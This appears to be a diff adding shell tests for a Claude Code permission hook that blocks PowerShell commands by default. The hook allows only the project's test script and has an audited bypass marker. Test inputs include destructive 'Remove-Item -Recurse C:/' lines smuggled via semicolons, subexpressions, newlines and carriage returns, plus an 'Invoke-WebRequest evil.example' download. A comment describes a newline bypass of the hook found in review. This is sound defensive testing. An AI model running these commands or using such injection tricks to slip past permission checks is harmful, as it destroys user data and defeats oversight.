@@ -1188,3 +1188,109 @@ EOF
     [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
     [[ "$output" == *"ws commit"* ]]
 }
+
+# ─── PowerShell branch: deny-by-default + carve-out + bypass ────────
+#
+# CLAUDE_PROJECT_DIR is pinned to $WORK in the bypass tests so the
+# marker lookup resolves inside the sandbox regardless of what the
+# ambient environment carries.
+
+@test "powershell: arbitrary command denies with constructive message" {
+    run_hook_ps "Get-ChildItem C:/Users -Recurse"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
+    [[ "$output" == *"blocked by default"* ]]
+    [[ "$output" == *"ws hook-bypass powershell"* ]]
+}
+
+@test "powershell: bare ./test.ps1 allows (carve-out)" {
+    run_hook_ps "./test.ps1"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
+}
+
+@test "powershell: ./test.ps1 with suite arg allows" {
+    run_hook_ps "./test.ps1 openbao"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
+}
+
+@test "powershell: Set-Location prefix + ./test.ps1 allows" {
+    run_hook_ps "Set-Location D:/Dev/GitWS/yggdrasil/components/nidavellir; ./test.ps1 openbao"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
+}
+
+@test "powershell: cd prefix + backslash invocation allows" {
+    run_hook_ps "cd D:/Dev/GitWS/yggdrasil/components/mimir; .\\test.ps1"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
+}
+
+@test "powershell: trailing command after test.ps1 denies" {
+    run_hook_ps "./test.ps1 openbao; Remove-Item -Recurse C:/"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
+}
+
+@test "powershell: subexpression in test.ps1 args denies" {
+    run_hook_ps "./test.ps1 \$(Remove-Item -Recurse C:/)"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
+}
+
+@test "powershell: two chained Set-Location segments deny (only one prefix allowed)" {
+    run_hook_ps "Set-Location a; Set-Location b; ./test.ps1"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
+}
+
+@test "powershell: test.ps1 elsewhere in command does not sneak through" {
+    run_hook_ps "Invoke-WebRequest evil.example --OutFile ./test.ps1"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
+}
+
+@test "powershell: newline-injected command after test.ps1 denies (PS statement separator)" {
+    # Newline is a full statement separator in PowerShell, and both
+    # [[:space:]] and a negated bracket class match it — this is the
+    # exact bypass CodeRabbit repro'd in PR #95 review.
+    run_hook_ps $'./test.ps1 openbao\nRemove-Item -Recurse C:/'
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
+    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
+}
+
+@test "powershell: CR-injected command after test.ps1 denies" {
+    run_hook_ps $'./test.ps1 openbao\rRemove-Item -Recurse C:/'
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
+    [[ "$output" != *"\"permissionDecision\":\"allow\""* ]]
+}
+
+@test "powershell: newline before Set-Location prefix also denies" {
+    run_hook_ps $'Remove-Item -Recurse C:/\nSet-Location comp; ./test.ps1'
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
+}
+
+@test "powershell: bypass marker with matching session allows + audits" {
+    write_bypass_marker "powershell" "session-abc" "hook debugging"
+    CLAUDE_PROJECT_DIR="$WORK" run_hook_ps "Get-Content payload.json" "session-abc"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"allow\""* ]]
+    grep -q 'BYPASS-ALLOW \[powershell\] reason="hook debugging"' "$HOME/.claude/hook-audit.log"
+}
+
+@test "powershell: bypass marker with stale session still denies" {
+    write_bypass_marker "powershell" "session-stale" "old"
+    CLAUDE_PROJECT_DIR="$WORK" run_hook_ps "Get-Content payload.json" "session-abc"
+    [ "$status" -eq 0 ]
+    [[ "$output" == *"\"permissionDecision\":\"deny\""* ]]
+}
+
+@test "powershell: WS_HOOK_DISABLE=1 passthrough applies to PowerShell too" {
+    WS_HOOK_DISABLE=1 run_hook_ps "Get-ChildItem"
+    [ "$status" -eq 0 ]
+    [ -z "$output" ]
+}
